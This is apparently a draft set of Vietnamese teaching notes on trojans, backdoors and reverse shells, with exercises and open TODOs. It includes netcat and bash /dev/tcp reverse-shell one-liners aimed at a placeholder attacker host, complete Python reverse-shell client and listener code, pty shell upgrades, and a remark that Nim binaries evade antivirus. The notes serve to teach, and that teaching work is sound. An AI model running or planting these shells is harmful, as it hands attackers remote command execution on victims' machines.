# 1. Trojan, Backdoor and Reverse Shell
## 1.1 Trojan (Trojan Horse) là phần mềm độc hại giả dạng phần mềm hợp pháp, lừa người dùng tự chạy.
Đặc điểm chung:
- Có chức năng ẩn (hidden functionality).
- Người dùng tự chạy → dẫn đến lây nhiễm.
- Không tự nhân bản như virus/worm. (TODO kiểm chứng dựa trên wiki)

Ví dụ trong thực tế defensive:
- File crack giả chứa payload để cài backdoor.
- Tập tin chứa macro độc hại.

## 1.2 Backdoor
Backdoor là cơ chế truy cập bí mật vào hệ thống mà không qua cơ chế xác thực thông thường.
Backdoor có thể:
- Được attacker cài vào sau khai thác.
- Được lập trình viên để lại (intentional/unintentional).
- Tồn tại dưới dạng service, hook, plugin hoặc script.

## 1.3. Reverse Shell là gì?
Reverse Shell là loại backdoor cho phép:
- Máy nạn nhân tự kết nối ngược về máy attacker.
- Attacker điều khiển qua kênh lệnh.

Reverse shell thường vượt firewall vì:
- Outbound traffic thường được cho phép.
- Hạn chế log bị chú ý hơn bind shell.

Ví dụ: Reverse shell sử dụng netcat
1. Attacker mở kết nối port 4444: `nc -lvnp 4444`
2. Client (victim) kết nối đến port 4444: `nc attacker_ip 4444 -e /bin/bash`

Bài tập: bindshell là gì?

# 2. Socket Programming và HTTP Programming trong Reverse Shell

## 2.1. Mô hình Client–Server
TODO: cần tìm hình minh họa, giải thích chi tiết và rõ ràng hơn (cụ thể OSI stack, vân vân)
Quy trình:
1. Server mở cổng listening.
2. Client kết nối đến server.
3. Server gửi lệnh → client nhận, thực thi.
4. Client gửi kết quả về.

## Ví dụ (TODO): code client - server socket
- Server code:

```
import socket

HOST = '127.0.0.1'  # Giao diện loopback tiêu chuẩn (localhost)
PORT = 9191         # Cổng để lắng nghe

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 2. Gán socket với địa chỉ và cổng
server_socket.bind((HOST, PORT))

# 3. Bắt đầu lắng nghe kết nối đến (tối đa 1 kết nối đang chờ)
server_socket.listen(1)
print(f"[*] Server đang lắng nghe trên {HOST}:{PORT}")

# Chờ và chấp nhận kết nối từ client
conn, addr = server_socket.accept()
print(f"[*] Đã chấp nhận kết nối từ: {addr[0]}:{addr[1]}")

try:
    # Vòng lặp chính để nhận và xử lý dữ liệu
    while True:
        # Nhận dữ liệu (tối đa 1024 bytes)
        data = conn.recv(1024)
        if not data:
            # Client đóng kết nối
            print("[-] Client đã đóng kết nối.")
            break

        # Giải mã dữ liệu nhận được (từ bytes sang string)
        client_data = data.decode('utf-8')

        # In ra màn hình theo yêu cầu
        print(f"Client gửi: <{client_data}>")

        # (Tùy chọn) Gửi phản hồi lại client
        conn.sendall(f"Server đã nhận: {client_data}".encode('utf-8'))

except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng kết nối và socket
    conn.close()
    server_socket.close()
    print("[*] Server đã tắt.")

```
- Client code:
```
import socket

# Cấu hình Host và Port của Server
HOST = '127.0.0.1'  # Địa chỉ server
PORT = 9191         # Cổng server

# 1. Tạo socket (AF_INET cho IPv4, SOCK_STREAM cho TCP)
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # 2. Kết nối đến Server
    client_socket.connect((HOST, PORT))
    print(f"[*] Đã kết nối đến Server {HOST}:{PORT}")

    # Vòng lặp chính để gửi dữ liệu
    while True:
        # Nhận input từ người dùng
        message = input("Nhập tin nhắn để gửi đến server (gõ 'quit' để thoát): ")
        
        if message.lower() == 'quit':
            break
        
        # Mã hóa và gửi dữ liệu đến server
        client_socket.sendall(message.encode('utf-8'))
        
        # (Tùy chọn) Nhận phản hồi từ server
        response = client_socket.recv(1024)
        print(f"Server phản hồi: {response.decode('utf-8')}")
        
except ConnectionRefusedError:
    print("Lỗi: Không thể kết nối. Hãy đảm bảo Server đang chạy.")
except Exception as e:
    print(f"Lỗi xảy ra: {e}")
finally:
    # Đóng socket
    client_socket.close()
    print("[*] Client đã tắt.")
```


<details>
<summary>Brainstorm: Khi đối chiếu Reverse Shell vào socket programming, đâu là client, dâu là server?</summary>

Trong reverse shell:

- Victim = client, khởi tạo kết nối.
- Attacker = server, lắng nghe connection.
</details>

Câu hỏi:
1. Nếu với bind shell, thì đâu là client, đâu là server?
2. Đối với giao thức mạng IPv4, việc sử dụng Reverse Shell hoặc Bind Shell có khó khăn gì?

## Viết reverse shell client và server với python
- Server:
```

import socket
import sys

# Cấu hình lắng nghe
LISTEN_HOST = '0.0.0.0' # Lắng nghe trên tất cả các giao diện
LISTEN_PORT = 9191      # Phải khớp với cổng trong reverse shell


def listener_server():
    # 1. Tạo socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Cho phép sử dụng lại địa chỉ/cổng ngay lập tức (tránh lỗi "Address already in use")
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # 2. Gán và lắng nghe
    server_socket.bind((LISTEN_HOST, LISTEN_PORT))
    server_socket.listen(1)
    print(f"[*] Server đang lắng nghe trên cổng {LISTEN_PORT}...")

    # 3. Chờ và chấp nhận kết nối
    conn, addr = server_socket.accept()
    print(f"[*] Reverse Shell đã kết nối từ: {addr[0]}:{addr[1]}")

    try:
        # Vòng lặp giao tiếp chính
        while True:
            # Nhận lệnh từ người dùng Attacker
            command = input("Shell> ")
            # sys.stdout.flush()

            if command.lower() == 'exit':
                conn.send(b'exit\n') # Gửi lệnh exit đến shell (tùy thuộc shell)
                break

            if not command:
                continue

            # Gửi lệnh và thêm ký tự xuống dòng (cần cho shell)
            conn.send(command.encode('utf-8') + b'\n')
            # Nhận và in phản hồi từ Victim
            response = conn.recv(1024).decode('utf-8', errors='ignore')
            print(response)

    except Exception as e:
        print(f"\n[-] Mất kết nối hoặc lỗi xảy ra: {e}")
    finally:
        # Đóng kết nối
        conn.close()
        server_socket.close()
        print("[*] Server đã đóng.")

if __name__ == '__main__':
    listener_server()

```

- Client:

```
import socket
import subprocess


# Cấu hình máy Attacker (Server)
ATTACKER_HOST = '127.0.0.1'  # THAY ĐỔI: IP thực tế của máy Attacker
ATTACKER_PORT = 9191         # Cổng Attacker đang lắng nghe

def reverse_shell():
    # 1. Tạo và kết nối socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ATTACKER_HOST, ATTACKER_PORT))

    # Vòng lặp chính để nhận và thực thi lệnh
    while True:
        # 2. Nhận lệnh từ Server (Attacker)
        command = s.recv(1024).decode('utf-8').strip()

        if not command or command.lower() == 'exit':
            s.send(b"[!] Closing.\n")
            break # Thoát khỏi vòng lặp nhận lệnh

        # 3. Thực thi lệnh sử dụng subprocess.run, redirect std vào PIPE
        try:
            # Khởi tạo tiến trình con
            output = subprocess.run(
                command,
                check=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            # 4. Gửi stdout về server. output là 1 namespace có cả stderr, ...
            s.sendall(output.stdout)
        except Exception as e:
            s.send(f"[-] Error: {str(e)}".encode('utf-8'))

    # 5. Đóng socket và nghỉ trước khi kết nối lại
    s.close()

if __name__ == '__main__':
    reverse_shell()

```

# 3. Interactive Shell và Non-Interactive Shell
TODO: giải thích interactive và non interactive, kiểm chứng ví dụ
phân biệt:
- Interactive Có TTY, có prompt, hỗ trợ Ctrl+C, tab-complete, ...
- Non interactive: không có tính năng trên

Tạo interactive shell và non interactive shell
- Bash: `bash -i >& /dev/tcp/ATTACKER/4444 0>&1`
- Python:
```
import socket, subprocess

s = socket.socket()
s.connect(("ATTACKER", 4445))

while True:
    cmd = s.recv(1024).decode()
    output = subprocess.getoutput(cmd)
    s.send(output.encode())

```
Ví dụ phân biệt:
- Giả sử chạy lệnh: `ls -lah /usr/bin/` -> non-interactive shell sẽ gửi toàn bộ -> bị cắt, vân vân. Interactive shell thì không bị (với directory to như system32 trên windows, interactive shell gửi hết data theo từng đoạn)
- Chạy `sudo su -`, non-interactive shell bị hang còn interactive shell hoạt động bt

Bài tập:
- Viết non-interactive shell với python nhưng xử lý vấn đề socket

## Nâng cấp non-interactive shell trên python:
```
import pty
pty.spawn("/bin/bash")
```
Tuy nhiên, sử dụng command line sẽ khác: `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Bài tập:
- Viết reverse shell với python nhưng sử có interactive shell
- Tìm, đọc và giải thích code interactive reverse shell trên C

# Ưu, nhược điểm của ngôn ngữ lập trình: TODO verify lại và tạo bảng
## Bash

Pros:
- Có sẵn trên mọi *nix.
- Dễ mở socket /dev/tcp.
- Tạo shell nhanh.

Cons:
- Khả năng mã hóa traffic kém.
- Dễ bị phát hiện trong logs.

Python:
Pros:
- Hỗ trợ socket mạnh.
- Có pty → nâng cấp shell.
- Dễ làm C2 prototype.

Cons:
- Python3 mặc định nhưng đôi khi bị cấm chạy trong hardening environment.

Perl

Pros:

Mạnh trong xử lý text & socket.

Một số môi trường cũ vẫn có.

Cons:

Ít phổ biến với dev trẻ, khó maintain.

4.2. Có thể có (tùy server): Ruby, PHP
Ruby

Có socket rất dễ dùng.

Dùng trong môi trường web server (Rails).

PHP

Thường xuất hiện trên shared hosting.

Reverse shell PHP thường dùng khi RCE trong webapp.

4.3. Các ngôn ngữ khác trong maldev research
Nim

Pros:

Compile ra binary nhỏ.

Dễ tránh detection do signature-based AV yếu với Nim.

Cross-platform.

Cons:

Cộng đồng nhỏ, ít thư viện.

Go (Golang)

Pros:

Static binary → deploy dễ.

Socket mạnh.

Cross-compilation siêu dễ.

Được APT thực tế sử dụng nhiều (Cobalt Strike BEACON reimplement, Sliver, Merlin).

Cons:

Binary lớn.

Số lượng IOC về Go-based malware tăng dần.